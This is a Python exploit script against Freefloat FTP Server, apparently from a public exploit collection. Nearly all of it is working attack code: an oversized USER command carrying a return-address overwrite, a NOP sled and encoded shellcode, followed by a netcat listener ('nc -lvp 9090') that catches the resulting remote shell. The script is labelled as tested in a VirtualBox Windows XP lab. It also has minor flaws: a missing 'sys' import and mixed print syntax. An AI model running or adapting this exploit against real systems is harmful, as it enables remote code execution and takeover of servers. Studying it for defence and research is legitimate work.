#Exploit title: Freefloat FTP Server Remote Command Execution USER Command Buffer Overflow
#Date:20th April 2019
#Exploit Author:Maurine Oromo
#Tested on Windows XP SP3 on a Virtualbox
import socket
import os

victim = "192.168.56.101"
port = 21

print("[+] Connecting to Victim.")
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.setdefaulttimeout(10)
soc.connect(("192.168.56.101", 21))

junk1="\x41"*230 #offset number --> 230
eip="\x6C\x74\xB9\x7C" # SHELL32.dll, 0x7CB9746C, JMP ESP
nops="\x90"*16
buf =  ""
buf += "\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\xa5\x93\xf3\xd0\x83\xee\xfc\xe2\xf4\x59\x7b"
buf += "\x71\xd0\xa5\x93\x93\x59\x40\xa2\x33\xb4\x2e\xc3\xc3"
buf += "\x5b\xf7\x9f\x78\x82\xb1\x18\x81\xf8\xaa\x24\xb9\xf6"
buf += "\x94\x6c\x5f\xec\xc4\xef\xf1\xfc\x85\x52\x3c\xdd\xa4"
buf += "\x54\x11\x22\xf7\xc4\x78\x82\xb5\x18\xb9\xec\x2e\xdf"
buf += "\xe2\xa8\x46\xdb\xf2\x01\xf4\x18\xaa\xf0\xa4\x40\x78"
buf += "\x99\xbd\x70\xc9\x99\x2e\xa7\x78\xd1\x73\xa2\x0c\x7c"
buf += "\x64\x5c\xfe\xd1\x62\xab\x13\xa5\x53\x90\x8e\x28\x9e"
buf += "\xee\xd7\xa5\x41\xcb\x78\x88\x81\x92\x20\xb6\x2e\x9f"
buf += "\xb8\x5b\xfd\x8f\xf2\x03\x2e\x97\x78\xd1\x75\x1a\xb7"
buf += "\xf4\x81\xc8\xa8\xb1\xfc\xc9\xa2\x2f\x45\xcc\xac\x8a"
buf += "\x2e\x81\x18\x5d\xf8\xfb\xc0\xe2\xa5\x93\x9b\xa7\xd6"
buf += "\xa1\xac\x84\xcd\xdf\x84\xf6\xa2\x6c\x26\x68\x35\x92"
buf += "\xf3\xd0\x8c\x57\xa7\x80\xcd\xba\x73\xbb\xa5\x6c\x26"
buf += "\x80\xf5\xc3\xa3\x90\xf5\xd3\xa3\xb8\x4f\x9c\x2c\x30"
buf += "\x5a\x46\x64\xba\xa0\xfb\x33\x78\x9d\xf4\x9b\xd2\xa5"
buf += "\xb0\x71\x59\x43\xf9\xe3\x86\xf2\xfb\x6a\x75\xd1\xf2"
buf += "\x0c\x05\x20\x53\x87\xdc\x5a\xdd\xfb\xa5\x49\xfb\x03"
buf += "\x65\x07\xc5\x0c\x05\xcd\xf0\x9e\xb4\xa5\x1a\x10\x87"
buf += "\xf2\xc4\xc2\x26\xcf\x81\xaa\x86\x47\x6e\x95\x17\xe1"
buf += "\xb7\xcf\xd1\xa4\x1e\xb7\xf4\xb5\x55\xf3\x94\xf1\xc3"
buf += "\xa5\x86\xf3\xd5\xa5\x9e\xf3\xc5\xa0\x86\xcd\xea\x3f"
buf += "\xef\x23\x6c\x26\x59\x45\xdd\xa5\x96\x5a\xa3\x9b\xd8"
buf += "\x22\x8e\x93\x2f\x70\x28\x03\x65\x07\xc5\x9b\x76\x30"
buf += "\x2e\x6e\x2f\x70\xaf\xf5\xac\xaf\x13\x08\x30\xd0\x96"
buf += "\x48\x97\xb6\xe1\x9c\xba\xa5\xc0\x0c\x05"
junk2="\x43"*16

username = junk1 + eip +nops + buf + junk2
password = "hacker"

try:
	print("[+] Sending Credentials.")
	soc.send("USER " + username + "\r\n")
	print(soc.recv(1024))

	soc.send("PASS " + password + "\r\n")
	print(soc.recv(1024))

	print("[+] Done! Closing connection.")
	soc.close()
	os.system("nc -lvp 9090") #started a listner on attacker (Kali Linux) machine.
except:
	print"[-] Connection to victim faied! \n"
	sys.exit(0)
